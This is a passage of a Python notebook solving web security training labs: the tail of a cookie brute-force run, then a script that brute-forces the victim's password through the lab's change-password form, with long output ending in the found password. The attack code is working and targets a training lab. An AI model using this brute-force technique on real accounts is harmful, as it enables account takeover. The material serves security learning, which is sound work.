# Status code: 302
# Trying cookie: ('robert', 'Y2FybG9zOjY4NGM4NTFhZjU5OTY1YjY4MDA4NmI3YjQ4OTZmZjk4')...
# Status code: 302
# Trying cookie: ('thomas', 'Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx')...
# Status code: 302
# Trying cookie: ('hockey', 'Y2FybG9zOmRmMDM0OWNlMTEwYjY5ZjAzYjRkZWY4MDEyYWU0OTcw')...
# Status code: 302
# Trying cookie: ('ranger', 'Y2FybG9zOmFkOTI2OTQ5MjM2MTJkYTA2MDBkN2JlNDk4Y2MyZTA4')...
# Status code: 302
# Trying cookie: ('daniel', 'Y2FybG9zOmFhNDdmODIxNWM2ZjMwYTBkY2RiMmEzNmE5ZjQxNjhl')...
# Status code: 302
# Trying cookie: ('starwars', 'Y2FybG9zOjViYWRjYWY3ODlkM2QxZDA5Nzk0ZDhmMDIxZjQwZjBl')...
# Status code: 200
# Cookie trovato!

# %% [markdown]
# ## Lab: Password brute-force via password change

# %% [markdown]
# This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.
#
# * Your credentials: wiener:peter
# * Victim's username: carlos
#
# Candidate passwords

# %%
import requests as re

def change_psw(passwords, url, username):

  cookies = {
      'session' : 'RDqWXtThQv5HKWmNIGz0medV6s6877BU',
      'session' : '3C09SLXEs5Luijnt21RplGbFIwn5mO6h'
  }

  data = {
      'username' : username,
      'current-password' : 'peter',
      'new-password-1' : '2',
      'new-password-2' : '1',
  }

  for p in passwords:
    data['current-password'] = p
    print(f"Trying username : {username} with password: {p}")
    res = re.post(url, data, allow_redirects=False, cookies=cookies)
    print(f"Status code: {res.status_code}")
    if('New passwords do not match' in res.text):
      print("Password trovata: "+p)
      break

# %%
change_psw(read_passwords('passwords.txt'), 'https://0a9800ef04187a4f8efd060b00d1005c.web-security-academy.net/my-account/change-password', 'carlos')
# Out:
# Trying username : carlos with password: 123456
# Status code: 200
# Trying username : carlos with password: password
# Status code: 200
# Trying username : carlos with password: 12345678
# Status code: 200
# Trying username : carlos with password: qwerty
# Status code: 200
# Trying username : carlos with password: 123456789
# Status code: 200
# Trying username : carlos with password: 12345
# Status code: 200
# Trying username : carlos with password: 1234
# Status code: 200
# Trying username : carlos with password: 111111
# Status code: 200
# Trying username : carlos with password: 1234567
# Status code: 200
# Trying username : carlos with password: dragon
# Status code: 200
# Trying username : carlos with password: 123123
# Status code: 200
# Trying username : carlos with password: baseball
# Status code: 200
# Trying username : carlos with password: abc123
# Status code: 200
# Trying username : carlos with password: football
# Status code: 200
# Trying username : carlos with password: monkey
# Status code: 200
# Trying username : carlos with password: letmein
# Status code: 200
# Trying username : carlos with password: shadow
# Status code: 200
# Trying username : carlos with password: master
# Status code: 200
# Trying username : carlos with password: 666666
# Status code: 200
# Trying username : carlos with password: qwertyuiop
# Status code: 200
# Trying username : carlos with password: 123321
# Status code: 200
# Trying username : carlos with password: mustang
# Status code: 200
# Trying username : carlos with password: 1234567890
# Status code: 200
# Trying username : carlos with password: michael
# Status code: 200
# Trying username : carlos with password: 654321
# Status code: 200
# Trying username : carlos with password: superman
# Status code: 200
# Trying username : carlos with password: 1qaz2wsx
# Status code: 200
# Trying username : carlos with password: 7777777
# Status code: 200
# Trying username : carlos with password: 121212
# Status code: 200
# Trying username : carlos with password: 000000
# Status code: 200
# Trying username : carlos with password: qazwsx
# Status code: 200
# Trying username : carlos with password: 123qwe
# Status code: 200
# Trying username : carlos with password: killer
# Status code: 200
# Trying username : carlos with password: trustno1
# Status code: 200
# Trying username : carlos with password: jordan
# Status code: 200
# Trying username : carlos with password: jennifer
# Status code: 200
# Trying username : carlos with password: zxcvbnm
# Status code: 200
# Trying username : carlos with password: asdfgh
# Status code: 200
# Trying username : carlos with password: hunter
# Status code: 200
# Trying username : carlos with password: buster
# Status code: 200
# Trying username : carlos with password: soccer
# Status code: 200
# Trying username : carlos with password: harley
# Status code: 200
# Trying username : carlos with password: batman
# Status code: 200
# Trying username : carlos with password: andrew
# Status code: 200
# Trying username : carlos with password: tigger
# Status code: 200
# Trying username : carlos with password: sunshine
# Status code: 200
# Trying username : carlos with password: iloveyou
# Status code: 200
# Trying username : carlos with password: 2000
# Status code: 200
# Trying username : carlos with password: charlie
# Status code: 200
# Trying username : carlos with password: robert
# Status code: 200
# Trying username : carlos with password: thomas
# Status code: 200
# Trying username : carlos with password: hockey
# Status code: 200
# Trying username : carlos with password: ranger
# Status code: 200
# Trying username : carlos with password: daniel
# Status code: 200
# Trying username : carlos with password: starwars
# Status code: 200
# Trying username : carlos with password: klaster
# Status code: 200
# Trying username : carlos with password: 112233
# Status code: 200
# Trying username : carlos with password: george
# Status code: 200
# Trying username : carlos with password: computer
# Status code: 200
# Trying username : carlos with password: michelle
# Status code: 200
# Trying username : carlos with password: jessica
# Status code: 200
# Trying username : carlos with password: pepper
# Status code: 200
# Trying username : carlos with password: 1111
# Status code: 200
# Trying username : carlos with password: zxcvbn
# Status code: 200
# Trying username : carlos with password: 555555
# Status code: 200
# Trying username : carlos with password: 11111111
# Status code: 200
# Trying username : carlos with password: 131313
# Status code: 200
# Trying username : carlos with password: freedom
# Status code: 200
# Trying username : carlos with password: 777777
# Status code: 200
# Trying username : carlos with password: pass
# Status code: 200
# Trying username : carlos with password: maggie
# Status code: 200
# Trying username : carlos with password: 159753
# Status code: 200
# Trying username : carlos with password: aaaaaa
# Status code: 200
# Trying username : carlos with password: ginger
# Status code: 200
# Trying username : carlos with password: princess
# Status code: 200
# Trying username : carlos with password: joshua
# Status code: 200
# Trying username : carlos with password: cheese
# Status code: 200
# Trying username : carlos with password: amanda
# Status code: 200
# Trying username : carlos with password: summer
# Status code: 200
# Trying username : carlos with password: love
# Status code: 200
# Trying username : carlos with password: ashley
# Status code: 200
# Trying username : carlos with password: nicole
# Status code: 200
# Trying username : carlos with password: chelsea
# Status code: 200
# Trying username : carlos with password: biteme
# Status code: 200
# Trying username : carlos with password: matthew
# Status code: 200
# Trying username : carlos with password: access
# Status code: 200
# Trying username : carlos with password: yankees
# Status code: 200
# Trying username : carlos with password: 987654321
# Status code: 200
# Trying username : carlos with password: dallas
# Status code: 200
# Trying username : carlos with password: austin
# Status code: 200
# Password trovata: austin
